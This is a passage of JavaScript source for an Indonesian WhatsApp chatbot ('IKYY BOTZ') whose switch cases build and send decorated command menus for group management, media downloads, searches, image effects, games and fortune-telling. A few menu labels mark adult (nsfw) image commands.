││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
╰─────────────────╮
╭─────────────────╯
│〘 DATABASE MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
╰─────────────────╮
╭─────────────────╯
│〘ANONYMOUS MENU〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
╰─────────────────╮
╭─────────────────╯
│  〘 ISLAMIC MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
╰─────────────────╮
╭─────────────────╯
│  〘 VOICE MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
╰─────────────────╮
╭─────────────────╯
│ 〘 OWNER MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
╰─────────────────╮
╭─────────────────╯
│    〘 THANKS TO 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ akatsuki for unity
││᭄⃟ꪶ⃟•╾ zZz - x - team
││᭄⃟ꪶ⃟•╾ and my friends❤ 
╰─────────────────╯

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'groupmenu':  case 'grupmenu': {
 if (!isCreator && !isBan) return 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│    ◪〘 GRUP MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'webzonemenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘 WEBZONE MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'downloadmenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘DOWNLOAD MENU〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'searchmenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 SEARCH MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'randommenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 RANDOM MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'tekspromenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘 TEKSPRO MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'ephotooxymenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘EPHITOOXY MENU〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'ephotomenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 EPHOTO MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'funmenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│    ◪〘 FUN MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'primbonmenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 PRIMBON MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
